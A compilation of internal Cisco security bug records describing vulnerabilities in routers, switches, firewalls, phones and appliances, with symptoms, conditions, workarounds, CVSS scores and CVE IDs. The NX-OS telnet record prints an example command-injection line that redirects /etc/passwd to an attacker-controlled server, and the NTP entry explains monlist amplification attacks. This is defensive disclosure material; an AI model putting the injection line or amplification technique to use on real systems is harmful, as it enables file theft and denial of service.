Title: Cisco IOS XR Software BVI Routed Packet Denial of Service Vulnerability
RNE: Symptom: A vulnerability in the packet-processing code of Cisco IOS XR Software for Cisco ASR 9000 Series Aggregation Services Routers (ASR) could allow an unauthenticated, remote attacker to cause a lockup and eventual reload of a network processor chip and the line card that is processing traffic. Only Typhoon-based line cards on Cisco ASR 9000 Series Aggregation Services Routers are affected by this vulnerability.  The vulnerability is due to improper processing of packets that are routed via the bridge-group virtual interface (BVI) when any of the following features are configured: Unicast Reverse Path Forwarding (uRPF), policy-based routing (PBR), quality of service (QoS), or access control lists (ACLs). An attacker could exploit this vulnerability by sending IPv4 packets through an affected device that is configured to route them via the BVI interface. A successful exploit could allow the attacker to cause a lockup and eventual reload of a network processor chip and the line card that is processing traffic, leading to a denial of service (DoS) condition.  Cisco has released free software updates that address this vulnerability. There are no workarounds to address this vulnerability.  This advisory is available at the following link: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20150415-iosxr  Conditions: Please see the published Cisco Security Advisory.  Workaround: Please see the published Cisco Security Advisory.  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 7.1/5.9:  http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2015-0695 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: The customer has hit NP lockup issue multiple times because of RFD double free.     RFD double free detected by HW? Yes - RFD free error in Resolve! Port=[75]- MSG DMA!The NPDatalog and datalog analysis is available at:/auto/tftp-blr-users1/santsha2/rjil_logs

Title: Cisco Nexus 3000 SNMP Non-Existent OID Denial of Service Vulnerability
RNE: Symptom: A vulnerability in Simple Network Management Protocol (SNMP) interface of the Nexus 3000 (N3K) Series Switch  could allow an authenticated, remote attacker to cause a partial denial of service (DoS) condition to the SNMP service running on the device.  The vulnerability is due to improper handling of a SNMP request with a non-existent Object Identifier (OID). An attacker  could exploit this vulnerability by sending a crafted SNMP request to the affected device. An exploit could allow the  attacker to cause a partial DoS condition of the SNMP interface where SNMP requests with legitimately formatted OIDs will timeout. The DoS condition does clear and SNMP requests will start to be processed normally as expected.  Conditions: Device running with default configuration running an affected version of software with SNMP globally.  Workaround: None.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4/3.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:S/C:N/I:N/A:P/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-2015-6308 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Cisco Prime Infrastructure CSRF Vulnerability
RNE: Symptom: A vulnerability in the web interface of Cisco Prime Infrastructure could allow an unauthenticated, remote attacker to conduct a cross-site request forgery (CSRF) attack against the user of the web interface. The vulnerability is due to insufficient CSRF protections. An attacker could exploit this vulnerability by convincing the user of the affected system to follow a malicious link or visit an attacker-controlled website. A successful exploit could allow an attacker to submit arbitrary requests to the affected device via the affected web browser with the privileges of the user.  Conditions: An attacker could exploit this vulnerability by convincing the user of the affected system to follow a malicious link or visit an attacker-controlled website.  Workaround: none  Further Problem Description:  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. Title: Remote service supports the use of anonymous SSL ciphers
RNE: Symptom: The default SSL cipher configuration uses certain insecure ciphers, including the anonymous cipher, which allows remote attackers to obtain sensitive information or have other, unspecified impacts.  Conditions: None  Workaround: None  Further Problem Description:  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 2.6/2.5: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:H/Au:N/C:P/I:N/A:N/E:F/RL:U/RC:C&version=2.0 No CVE ID has been assigned to this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: A security scan of the MSE 8510 running software version 4.1(1.51) by the Nessus scanner shows the following result:;Codian MSE 8510 blade, Security violation on port 5061 - The remote service supports the use of anonymous SSL ciphers.The remote host supports the use of anonymous SSL ciphers. While this enables an administrator to set up a service that encrypts traffic without having to generate and configure SSL certificates, it offers no way to verify the remote host's identity and renders the service vulnerable to a man-in-the-middle attack.;The related CVE is CVE-2007-1858.  Research shows that this is a vulnerability in Apache Tomcat that was fixed in Tomcat version 4.1.32 and 5.5.17 as per https://tomcat.apache.org/security-4.html and http://tomcat.apache.org/security-5.html - the affected versions of Apache Tomcat are 4.1.28-4.1.31 as well as 5.0.0-5.0.30, 5.5.0-5.5.16.
PSIRT: PSIRT-owner: psirt@cisco.com           This issue has been evaluated and driven to closure by PSIRT. Title: Cisco VDS SDP over SIP Denial of Service (DOS) Vulnerability
RNE: Symptoms: A vulnerability in Session Description Protocol (SDP) parser of the Cisco TelePresence Video Communication Server (VCS) could allow an unauthenticated, remote attacker to cause the VSC  device to become unreachable due to a denial of service (DoS) attack which causes high CPU utilization.  The vulnerability is due to parsing error of the SDP parameter negotiation request. An attacker could  exploit this vulnerability by initiating a SDP session over a Session Initiation Protocol (SIP) connection to the VCS device and sending a crafted SDP parameter negotiation request. An exploit could allow the  attacker to to take the VCS device offline due to high CPU utilization caused by the DoS attack.  Conditions: Device running with default configuration running an affected version of software.  Workaround: None.  Further Problem Description: The Access Complexity of this vulnerability is high due to the need for a Man In the Middle (MITM)  attack needed to compromise the SIP connection which is authenticated and then in turn compromise the SDP session to send the crafted SDP packet which could cause DoS condition.   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 5.4/5.4: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:H/Au:N/C:N/I:N/A:C/E:H/RL:U/RC:C&version=2.0 CVE ID CVE-2015-0772 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: SDP received from new SDP parser causes main app to be pegged at 100%

Title: 9971 phone becomes unresponsive when receiving malformed RTP packets
RNE: Symptoms:  A vulnerability in the packet storing capabilities of the 9900 series IP Phone could allow an unauthenticated, remote attacker to send malformed RTP packets to the phone buffer.  The vulnerability is due to how the phone decoder handles certain RTP packets. An attacker could exploit this vulnerability by calling a registered phone, waiting for a user to answer then send malformed RTP packets to the users phone.    Conditions: A 9971 phone running firmware version 9-3-2ES-8 and registered to CUCM version: 8.6.2.25140-1  Workaround: None.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/3.6: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:N/A:P/E:F/RL:OF/RC:C&version=2.0 No CVE ID has been assigned to this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Certain malformed RTP payloads in received RTP streams causes memory exhaustion leading to phone becomes unresponsive.  When this situation happens especially SSRC changes in mid-call and subsequently there will no audio in either direction.  Only way to recover the phone is to power cycle the phone.

Title: Cisco Web Security Appliance OpenSSH Vulnerability
RNE: Symptom: Cisco Email Security Appliance (ESA) and Web Security Appliance (WSA) includes a version  of the Open Secure Host (OpenSSH) Protocol that is affected by the vulnerabilities identified  by the following Common Vulnerability and Exposures (CVE) IDs:   CVE-2016-6210, CVE-2016-6515  This bug was opened to address the potential impact on this product.  Conditions: Device with default configuration.  Workaround: Applied openSSH third party patch  Further Problem Description: Additional details about the vulnerabilities listed above can be found at http://cve.mitre.org/cve/cve.html.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 7.5: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:X/RL:X/RC:X  CVE ID CVE-2016-6210, CVE-2016-6515 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: There are 4 vulnerabilities for hosts running OpenSSH versions 7.2 and earlier. Currently the latest version of OpenSSH installed on the WSA latest code 10.1 has only OpenSSH 6.2_hpn13v11 installed, making the WSA vulnerable.Vulnerabilities listed here - https://vulners.com/nessus/OPENSSH_73.NASL CVE-2016-6210- A flaw exists that is due to the program returning shorter response times for authentication requests with overly long passwords for invalid users than for valid users. This may allow a remote attacker to conduct a timing attack and enumerate valid usernamesCVE-2016-6515- A denial of service vulnerability exists in the auth_password() function in auth-passwd.c due to a failure to limit password lengths for password authentication. An unauthenticated, remote attacker can exploit this, via a long string, to consume excessive CPU resources, resulting in a denial of service conditionVulnDB 142343- An unspecified flaw exists in the CBC padding oracle countermeasures that allows an unauthenticated, remote attacker to conduct a timing attack. VulnDB 142344- A flaw exists due to improper operation ordering of MAC verification for Encrypt-then-MAC (EtM) mode transport MAC algorithms when verifying the MAC before decrypting any ciphertext. An unauthenticated, remote attacker can exploit this, via a timing attack, to disclose sensitive information.

Title: Cisco Unified Communications Manager Disk Utilization Denial of Service Vulnerability
RNE: $$IGNORE-PSIRT  CISCO HIGHLY CONFIDENTIAL - CONTROLLED ACCESS  This issue is under review by the Cisco Product Security Incident Response team (PSIRT).  The defect describes a product security vulnerability.  Its contents must be protected from unauthorized disclosure, both internal and external to Cisco. (tfinn-02/14/17)  $$IGNORE-PSIRT  Symptoms: A vulnerability in local file management of certain system log files of Cisco Unified Communications Manager could allow an unauthenticated, remote attacker to  cause high disk utilization resulting in a denial of service (DoS) condition.   The vulnerability is due to a certain system log file not being capped in size and being able to consume the majority of the disk space. An attacker could exploit  this vulnerability by sending crafted connection requests to the device. An exploit could allow the attacker to cause a system log file to grow exponentially in size  and consume most of the disk space. This DoS condition could cause the user to see database replication failures.  Conditions: The follow error logs are observed:  ./hssi_defines.sh: line 114: echo: write error: No space left on device ./hssi_defines.sh: line 115: echo: write error: No space left on device   Workaround: TBD - can the /etc/logrotate.conf file be edited manually?  Further Problem Description: External access from outside network has SSH (Port 22) opened and accessible to CUCM will allow many attempts at login via SSH and fill up the  ''/var/log/btmp'' file and fill up the Active Partition.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 8.6: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-6779 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: ;/var/log/btmp; Disk Filling Up Due To Incorrect ;/etc/logrotate.conf; Configuration FileThe current configuration of the ;/etc/logrotate.conf; doesn't allow for the ;btmp; file to be rotated and will start to fill up CUCM Active Partition to 100%, thus rendering further operations on the node impaired. ***************************************************************cat /etc/logrotate.conf # no packages own wtmp and btmp -- we'll rotate them here/var/log/wtmp {    monthly    create 0664 root utmp	minsize 1M    rotate 1}/var/log/btmp {    missingok    monthly    create 0600 root utmp    rotate 1} ***************************************************************

Title: Cisco ASA IPv6 NAT Denial of Service Vulnerability
RNE: Symptoms: ASA crash in thread name DATAPATH-0-1162  Conditions: NAT66 or NAT64 is configured  Workaround: none  Further Problem Description: A vulnerability in function performing IP Version 6 Network Address Translation (NAT) of the Cisco ASA Software could allow an unauthenticated, remote attacker to a reload of an affected system.  The vulnerability is due to improper implementation of the logic that performs the NAT when the Cisco ASA is configured for NAT64 or NAT66. This vulnerability can be triggered only under specific configuration. An attacker could exploit this vulnerability by sending packets through the affected system that would hit one of the NAT rule. An exploit could allow the attacker to cause the reload of an affected system.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 5.4/4.5: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:H/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2013-5560 has been assigned to document this issue.  Additional details about the vulnerability described here can be found at: http://tools.cisco.com/security/center/content/CiscoSecurityNotice/CVE-2013-5560  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

He tries to map all the IPV4 address on the outside to IPV6 on the inside.in the process this ASA5515 crashed.Relevant config:object network ipv4-access subnet 0.0.0.0 0.0.0.0object network inside-network6 subnet 2a02:17c8:99::/64object network ipv4-access nat (outside,inside) static 2a02:17c8::/96 net-to-netobject network inside-network6 nat (inside,outside) dynamic interfaceobject network inside-host nat (any,any) static 195.24.180.6ftp connection to an ftp server on the outside from a linux IPV6 on the inside works fine. Later when he changes the object to change the mask the unit crashes. He tried to recreate it on his setup and it the unit didn't crash.object network ipv4-access subnet 0.0.0.0 128.0.0.0

Title: remove rpc from linux package
RNE: Symptoms:  Cisco NX-OS includes a version of statd that is affected by the  vulnerabilities identified by the following Common Vulnerability and Exposures (CVE) IDs:  CVE-2000-0666,CVE-2000-0800  This bug was opened to address the potential impact on this product.  Conditions:  Device with default configuration.  Workaround:  Not currently available.  Further Problem Description:  Additional details about the vulnerabilities listed above can be found  at http://cve.mitre.org/cve/cve.html  PSIRT Evaluation:  The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 10/8.3:  http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C&version=2.0  CVE-2000-0666, and CVE-2000-0800 have been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL:  http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: 3rd party software detects followingQID: 66040 Category: RPC CVE ID: CVE-2000-0666 CVE-2000-0800 Vendor Reference RHSA-2000-043 THREAT: The rpc.statd program, which is part of the nfs-utils packages, is distributed with a number of popular Linux distributions. The rpc.statd server is an RPC server that implements the Network Status and Monitor RPC protocol. It's a component of the Network File System (NFS) architecture. rpc.statd contains a format string vulnerability when calling the syslog() function. This vulnerability allows remote users to execute code as root. The logging code in rpc.statd uses the syslog() function to pass user-supplied data as the format string. A malicious user can construct a format string that injects executable code into the process address space and overwrites a function's return address, forcing the program to execute the code. rpc.statd requires root privileges for opening it's network socket, but fails to drop these privileges later on. Therefore, code injected by the malicious user will execute with root privileges. Debian, Red Hat and Connectiva have all released advisories on this matter. Presumably, any Linux distribution that runs the statd process is vulnerable, unless already patched for the problem. IMPACT: If successfully exploited, unauthorized users can execute remote commands as root.

Title: NTP Attacks Using CVE-2013-5211
RNE: Symptom: A vulnerability in Network Time Protocol (NTP) package of Cisco Finesse Software could allow an unauthenticated, remote attacker to cause a Denial of Service (DoS) condition on an affected device.  The vulnerability is due to processing of MODE_PRIVATE (Mode 7) NTP control messages which have a large amplification vector. An attacker could exploit this vulnerability by sending Mode 7 control requests to NTP servers and observing responses amplified up to 5500 times in size. An exploit could allow the attacker to cause a Denial of Service (DoS) condition where the affected NTP server is forced to process and respond with large response data.  Conditions: All versions of ntpd prior to 4.2.7 are vulnerable by default.  Workaround: The simplest recommended course of action is to upgrade all versions of ntpd that are publically accessible to at least 4.2.7. However, in cases where it is not possible to upgrade the version of the service, it is possible to disable the monitor functionality in earlier versions of the software.  To disable ?monlist? functionality on a public-facing NTP server that cannot be updated to 4.2.7, add the ?noquery? directive to the ?restrict default? line in the system's ntp.conf, as shown below:  restrict default kod nomodify notrap nopeer noquery restrict -6 default kod nomodify notrap nopeer noquery disable monitor  After the change is done, restart ntpd service.  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  5/4.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:N/A:P/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-2013-5211 has been assigned to document this issue.  Additional details about the vulnerability described here can be found at: http://tools.cisco.com/security/center/content/CiscoSecurityNotice/CVE-2013-5211  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: The NTP service supports a monitoring service that allows administrators to query the server for traffic counts of connected clients. This information is provided via the ?monlist? command. The basic attack technique consists of an attacker sending a ;get monlist; request to a vulnerable NTP server, with the source address spoofed to be the victim's address.Impact:The attack relies on the exploitation of the ;monlist; feature of NTP, as described in CVE-2013-5211, which is enabled by default on older NTP-capable devices. This command causes a list of the last 600 IP addresses which connected to the NTP server to be sent to the victim. Due to the spoofed source address, when the NTP server sends the response it is sent instead to the victim. Because the size of the response is typically considerably larger than the request, the attacker is able to amplify the volume of traffic directed at the victim. Additionally, because the responses are legitimate data coming from valid servers, it is especially difficult to block these types of attacks. The solution is to disable ?monlist? within the NTP server or to upgrade to the latest version of NTP (4.2.7) which disables the ;monlist; functionality.

Title: Cisco TelePresence Endpoint Denial of Service Vulnerability
RNE: Symptom: A vulnerability in the Session Initiation Protocol (SIP) of the Cisco TelePresence Collaboration Endpoint (CE/TC) Software could allow an unauthenticated, remote attacker to cause a TelePresence endpoint to reload unexpectedly, resulting in a denial of service (DoS) condition.  The vulnerability is due to a lack of flow-control mechanisms within the software. An attacker could exploit this vulnerability by sending a flood of INVITE SIP packets to the affected device. An exploit could allow the attacker to impact the availability of services and data of the device including a complete DoS condition.  Conditions: Device running an affected version of Cisco software.  Workaround: Refer to Cisco Security Advisory.  Further Problem Description: This vulnerability was externally reported to Cisco PSIRT by Senior Security Consultant Knud Hojgaard with F-Secure.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 7.5: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-6648 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Cisco AsyncOS for Cisco WSA Cluster Denial of Service Vulnerability
RNE: Symptom: A vulnerability in the clustering component of Cisco AsyncOS for Cisco Web Security Appliance (WSA) could allow an unauthenticated, remote attacker to cause the device to become unresponsive on the clustering and SSH configured ports.  The vulnerability is due to improper handling of packets when sent at high rate when the system is configured for clustering. An attacker could exploit this vulnerability by sending high rate packets against the target system. An exploit could allow the attacker to cause the affected system to become unresponsive on the clustering and Secure Shell (SSH) configured ports. Because  of this all new connections to these ports will fail. A reload is required to restore the normal operational behavior.  Conditions: Device running with default configuration running an affected version of software. There is a flood of packets to the SSH listening ports.  Workaround: None.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 5/4.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:N/A:P/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-2015-4236 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: WLC crashing on task emwebauth1 : webauthProcessAsyncResponse
RNE: Symptoms: A vulnerability in the wireless web authentication subsystem of Cisco Wireless LAN controller devices could allow an unauthenticated, adjacent attacker to cause a denial of  service (DoS) condition.  The vulnerability exists due to improper input sanitization of a certain value that is supplied by a user prior to successfully authenticating to an affected device.  An attacker could  leverage this vulnerability by sending a request designed trigger the issue and cause a process crash that will trigger a restart of the device.  Conditions: Cisco Wireless LAN Controller devices running versions 7.5.x or versions prior to 7.6.120. Versions 7.4.x.x and lower, and 7.6.120.0, 8.x, etc and higher are not affected  Workaround: None available  Further Problem Description:  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 6.1/5: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:A/AC:L/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2015-0723 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Cisco ACS - Multiple XSS vulnerabilities
RNE: Symptom: Cisco Secure Access Control System XSS Vulnerability (ACS) contains a vulnerability that could allow an unauthenticated, remote attacker to conduct a DOM based cross-site scripting (XSS) attack against the user of the web interface of the affected system. The vulnerability is due to insufficient input validation of a user-supplied value. An attacker may be able to exploit this vulnerability by intercepting the user packets and injecting malicious code.  Conditions: Device configured with default configuration, running an affected version of Cisco software.  Workaround: None.  Further Problem Description: Additional information about XSS attack and potential mitigations can be found at: http://www.cisco.com/en/US/products/cmb/cisco-amb-20060922-understanding-xss.html   Credit: This vulnerability was reported to Cisco by Lukasz Plonka from ING Services Polska.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 4.7: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-3838 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Cisco Meshed Wireless LAN Controller Impersonation Vulnerability
RNE: Symptom: A vulnerability in the mesh code of Cisco Wireless LAN Controller (WLC) software could allow an unauthenticated, remote attacker to impersonate a WLC in a meshed topology.  The vulnerability is due to insufficient authentication of the parent access point in a mesh configuration. An attacker could exploit this vulnerability by forcing the target system to disconnect from the correct parent access point and reconnect to a rogue access point owned by the attacker. An exploit could allow the attacker to control the traffic flowing through the impacted access point or take full control of the target system.  Cisco has released software updates that address this vulnerability. Note that additional configuration is needed in addition to upgrading to a fixed release. There are no workarounds that address this vulnerability.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170315-wlc-mesh  Conditions: See advisory  Workaround: See advisory  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 8.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L/E:X/RL:X/RC:X  CVE ID CVE-2017-3854 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: IOS Software Zone Based Firewall memory exhaustion vulnerability
RNE: Symptom: Cisco IOS Software when configured with Zone Based Firewall feature enabled contains a vulnerability that could allow an unauthenticated remote attacker to consume the memory of the affected device. This in turn may lead to a system instability and potentially to a system reload depending on the available total memory on the affected device and race conditions, such us other features requiring memory while the attack is in progress. The vulnerability is due to improper memory allocation when the zone based firewall code allocate memory for connection transiting the affected system.  Note: the memory exhaustion happens only during the attack and the affected device recover as soon as the attack is terminated.  Conditions: Zone based firewall is configured to inspect tcp sessions.   Workaround: You can configure parameter map to make sure half open session are limited. In order to do that, parameter-map type inspect or global needs to be configured with DOS and others fields from unlimited to suitable limits based your platform and other features on the the router  The above parameter has the following fields to configure  DOS Limits =========   max-incomplete low   max-incomplete high   one-minute low   one-minute high   tcp max-incomplete host  block-time 0  Total maximum established sessions ==============================   sessions maximum  Refer the below link on tuning the DOS parameters.  http://www.cisco.com/en/US/prod/collateral/vpndevc/ps5708/ps5710/ps1018/prod_white_paper0900aecd8055e6ac.html   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 5.4/4.5: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:H/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2012-6398 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: This is being filed as part of CAP CAP002725. Twice the cu has experienced crashes due to low memory early in the morning.In one the show mem sum was incomplete due to the crash being due to memory corruption. In the second crash the crash wasn't mem corruption, so the show mem sum was complete. In that crash, the show mem sum shows 68 MB used by ;CCE dp feature; which explicitly points at CCE dp. That same show mem sum shows another 85 MB worth of blocks as coalesced freed Blocks with allocating pc chunk_create_caller. There's nothing to directly tell what was causing this set of 85 MB worth of memory to be used, but it seems likely to be CCE related.Note: breaking SEC-BE-STABLE	Remain stable during flooding attack

Title: WSA - Header injection
RNE: Symptoms: User clicking on a link pointing to a Cisco AsyncOS for WSA maybe redirected to a different webpage Conditions: none  Workaround: none  Further Problem Description: A vulnerability in the web framework of Cisco AsyncOS could allow an unauthenticated, remote attacker to inject a crafted HTTP header that could cause a web page redirection to a possible malicious website.  The vulnerability is due to insufficient validation of user input before it is used as an HTTP header value. An attacker could exploit this vulnerability by persuading a user to access a crafted URL. This vulnerability was reported to Cisco by Glafkos Charalambous.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/4.3: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:N/E:H/RL:U/RC:C&version=2.0 CVE ID CVE-2015-0624 has been assigned to document this issue. Title: Disable Fast SSID change for NAC Wireless OOB setup
RNE: Symptom: Wireless clients without NAC agent can associate to guest WLAN where NAC is not enabled. When FAST SSID Change is enabled globally on WLC, wireless clients (without NAC agent) can then disassociate from guest WLAN and immediately associate to corporate WLAN (NAC enabled) and be placed directly in Access vlan without passing to quarantine role.   Conditions Cisco WLC configured with the FAST SSID feature enabled.   Workaround: Disable Fast SSID change config globally on WLC   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 3.3/3:  http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:A/AC:L/Au:N/C:P/I:N/A:N/E:F/RL:W/RC:C&version=2.0  No CVE ID has been assigned to this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Cisco TelePresence Server Denial of Service Vulnerability
RNE: Symptom: Cisco TelePresence Server contains a buffer overflow vulnerability in the Conference Control Protocol API that could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition. Workaround: Upgrade to Cisco TelePresence Server software release 4.1(2.33) or later.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 7.8/6.4: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2015-6284 has been assigned to document this issue. Title: Cisco Nexus 3K/5K/6K/7K/9K/MDS/9500 R-Series(8K) Telnet CLI Command Injection Vulnerability
RNE: Symptom: A vulnerability in the Telnet CLI command of Cisco NX-OS System Software running on Nexus Series Switches could allow an authenticated, local attacker to perform a command injection attack.  The vulnerability is due to insufficient input validation of command arguments. An attacker could exploit this vulnerability by injecting crafted command arguments into the Telnet CLI command. An exploit could allow the attacker to read or write arbitrary files at the user's privilege level outside of the user's path.  Conditions:  Workaround: A mitigation exists to deny users access to the telnet command through a custom role.  For example: The network-operator role has one rule to permit read.  N7K# show role name network-operator   Role: network-operator   Description: Predefined network operator role has access to all read   commands on the switch   -------------------------------------------------------------------   Rule    Perm    Type        Scope               Entity                     -------------------------------------------------------------------   1       permit  read     Create a custom role that denies the Telnet command and apply it to a user.  role name net-oper   rule 2 deny command telnet *   rule 1 permit read    username test password 5 snip role net-oper  N7K# show users NAME     LINE         TIME         IDLE          PID COMMENT test     ttyS0        Jul 21 16:09   .         25599 *  N7K# telnet 192.168.x.x % Permission denied for the role  Further Problem Description: For information about vulnerable and not vulnerable software releases, and time frame for fixed software releases, please open a support case with your support organization. PSIRT does not provide or maintain this information for Medium SIR advisories.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 4.4: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-6650 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: The ;telnet; command does not properly validate its arguments, allowing a malicious user to change the behavior of the command and possibly escalate privileges. For example, this issue could be exploited to read and write files outside of intended locations, using shell redirection:  switch# telnet attacker-controlled-server</etc/passwdHowever, this example is not exhaustive. To fully fix the issue, any arguments that are passed to shell commands should be validated to ensure they cannot introduce any unexpected arguments or behavior, preferably using a whitelist.
